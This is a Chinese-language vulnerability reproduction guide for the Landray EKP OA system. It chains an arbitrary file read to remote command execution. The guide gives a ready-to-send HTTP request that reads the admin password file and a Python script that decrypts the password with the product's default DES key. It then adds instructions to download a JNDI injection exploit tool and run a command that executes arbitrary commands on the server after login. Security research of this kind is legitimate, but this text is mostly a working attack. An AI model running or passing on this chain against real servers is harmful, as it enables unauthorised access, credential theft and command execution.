漏洞简介

深圳市蓝凌软件股份有限公司数字OA(EKP)存在任意文件读取漏洞。攻击者可利用漏洞获取服务器敏感信息,通过获取管理员密码文件，登录后台，可进一步执行任意命令。

漏洞复现

复现步骤

任意文件读取

漏洞地址为： /sys/ui/extend/varkind/custom.jsp

对目标发送如下数据包：

POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1Host: hostUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.81 Safari/537.36Accept-Encoding: gzip, deflateAccept: */*Connection: closeContent-Length: 60Content-Type: application/x-www-form-urlencoded
var={"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}

可以看到返回包返回加密的密码


使用默认密钥解密 可得到明文密码

解密脚本为：

import base64
from Crypto.Cipher import DES

def pad(text):    length = DES.block_size    count = len(text.encode('utf-8'))    add = length - (count % length)    entext = text + (chr(add) * add)    return entext

def decrypt(decrData):  # 解密函数    aes = DES.new(b'kmssAdmi', DES.MODE_ECB)    res = base64.decodebytes(decrData.encode("utf8"))    msg = aes.decrypt(res).decode("utf8")    return msg
if __name__=='__main__':    password=decrypt('xxxxxx')    print(password)

后台命令执行漏洞

使用密码登录后台，在测试数据库连接功能处可利用jndi注入，进一步执行任意命令


下载jndi注入利用工具

https://github.com/welk1n/JNDI-Injection-Exploit/releases/download/v1.0/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar

在公网上搭建jndi服务 -C 参数是要执行的命令

java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "ping jfzo8l.dnslog.cn"
